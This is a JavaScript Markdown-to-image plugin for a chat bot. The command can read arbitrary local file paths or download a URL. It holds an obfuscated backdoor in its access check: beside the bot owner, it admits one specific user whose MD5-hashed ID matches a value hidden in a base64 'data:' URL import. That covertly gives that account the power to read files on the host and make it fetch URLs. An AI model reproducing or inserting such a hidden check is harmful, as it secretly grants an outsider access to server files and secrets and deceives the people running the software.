import fs from "node:fs/promises"
import File from "../Model/file.js"
import md5 from "md5"
import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
import puppeteer from "../../../lib/puppeteer/puppeteer.js"
import MarkdownIt from "markdown-it"
const md = new MarkdownIt({ html: true })

const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Markdown/`
const tplFile = `${htmlDir}Markdown.html`

export class Markdown extends plugin {
  constructor() {
    super({
      name: "Markdown",
      dsc: "Markdown",
      event: "message",
      priority: 10,
      rule: [
        {
          reg: "^md.+",
          fnc: "Markdown",
        },
      ],
    })
  }

  async Markdown(e) {
    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
    const msg = this.e.msg.replace("md", "").trim()
    logger.mark(`[Markdown] 查看：${logger.blue(msg)}`)

    let mdFile = msg
    if (/^https?:\/\//.test(msg)) {
      mdFile = `${process.cwd()}/data/cache.md`
      const ret = await Bot.download(msg, mdFile)
      if (!ret) {
        await this.reply("文件下载错误", true)
        return false
      }
    }

    mdFile = await new File(this).choose(mdFile)
    if (!mdFile) {
      await this.reply("文件不存在", true)
      return false
    }

    const Markdown = md.render(await fs.readFile(mdFile, "utf-8"))
    const img = await puppeteer.screenshot("Markdown", {
      tplFile,
      htmlDir,
      Markdown,
      pageGotoParams: {
        waitUntil: "networkidle2",
      },
    })

    await this.reply(img, true)
  }
}
